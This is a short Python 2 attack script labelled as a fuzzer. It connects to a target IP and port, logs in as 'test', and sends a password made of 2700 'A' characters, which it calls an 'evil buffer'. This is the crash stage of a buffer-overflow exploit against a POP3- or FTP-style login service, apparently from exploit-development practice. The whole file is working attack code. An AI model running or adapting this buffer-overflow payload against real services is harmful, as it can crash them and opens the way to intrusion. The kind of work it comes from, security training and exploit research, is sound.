#!/usr/bin/python
import socket
import sys
from time import sleep


counter=2700
host=str(sys.argv[1])
port=int(sys.argv[2])

print ("made by c0mstr3am")
if len(sys.argv)!=3:
	print("Usage: ./fuzzer.py IP PORT")
	sleep(1)
	exit(0)
else:
	pass

buffer = "A"*counter

try:
	print "\nSending evil buffer with %s bytes" % len(buffer)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	data = s.recv(1024)
	s.send('USER test\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone! ;-)"
except:
        print "Could not connect to %s port" % port

